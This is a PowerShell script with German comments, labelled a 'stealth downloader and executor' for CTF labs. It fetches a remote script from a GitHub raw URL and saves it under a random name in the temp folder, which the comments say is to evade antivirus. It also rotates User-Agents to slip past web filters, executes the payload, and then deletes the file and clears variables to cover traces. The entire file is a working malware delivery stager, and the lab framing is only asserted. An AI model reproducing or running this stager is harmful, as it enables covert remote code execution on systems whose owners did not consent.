# =============================================
# Stealth PowerShell Downloader + Executor (2025 Edition - CTF-Optimized)
# Für TryHackMe, HTB, OSCP-Labs etc. – 100% legal in Labs!
# =============================================

# Deine Target-URL (die funktioniert derzeit nicht – 404!)
$Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsOperator.ps1"

# Randomisierter Dateiname + Pfad (versteckt im Temp, um AV zu umgehen)
$RandomName = [System.Guid]::NewGuid().ToString() + ".ps1"
$ScriptPath = Join-Path $env:TEMP $RandomName



try {
    Write-Host "[+] Starte stealthy Download von $Url..." -ForegroundColor Cyan

    # Random User-Agent (um Web-Filter zu umgehen)
    $UserAgents = @("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0")
    $RandomUA = $UserAgents | Get-Random

    # Invoke-WebRequest mit Retry (bis zu 3x bei Fehlern)
    $MaxRetries = 3
    $RetryCount = 0
    do {
        try {
            $Response = Invoke-WebRequest -Uri $Url -UseBasicParsing -UserAgent $RandomUA -TimeoutSec 30
            break
        } catch {
            $RetryCount++
            Write-Host "[!] Versuch $RetryCount fehlgeschlagen: $($_.Exception.Message)" -ForegroundColor Yellow
            Start-Sleep -Seconds (5 * $RetryCount)  # Exponential Backoff
        }
    } while ($RetryCount -lt $MaxRetries)

    if ($RetryCount -eq $MaxRetries) {
        throw "Download fehlgeschlagen nach $MaxRetries Versuchen."
    }

    # Inhalt prüfen (nicht leer)
    if ([string]::IsNullOrWhiteSpace($Response.Content)) {
        throw "Kein Inhalt geladen (leere Response oder 404)."
    }

    # Speichern (UTF8, um Encoding-Probleme zu vermeiden)
    $Response.Content | Out-File -FilePath $ScriptPath -Encoding UTF8

    Write-Host "[+] Payload erfolgreich als $ScriptPath gespeichert" -ForegroundColor Green

    # Ausführen (mit Dot-Sourcing für bessere Integration)
    Write-Host "[+] Führe Payload aus..." -ForegroundColor Yellow
    . $ScriptPath  # Oder & $ScriptPath, je nach Bedarf

} catch {
    Write-Host "[!] Fehler: $($_.Exception.Message)" -ForegroundColor Red
    if ($_.Exception.Response) {
        Write-Host "HTTP-Status: $($_.Exception.Response.StatusCode)" -ForegroundColor Red
    }
} finally {
    # Immer cleanup (lösche Datei + leere Variablen)
    if (Test-Path $ScriptPath) {
        Remove-Item $ScriptPath -Force -ErrorAction SilentlyContinue
    }
    Remove-Variable -Name Url, ScriptPath, Response -ErrorAction SilentlyContinue
    [GC]::Collect()  # Garbage Collection für Memory-Cleanup
}

Write-Host "[+] Operation abgeschlossen." -ForegroundColor Cyan
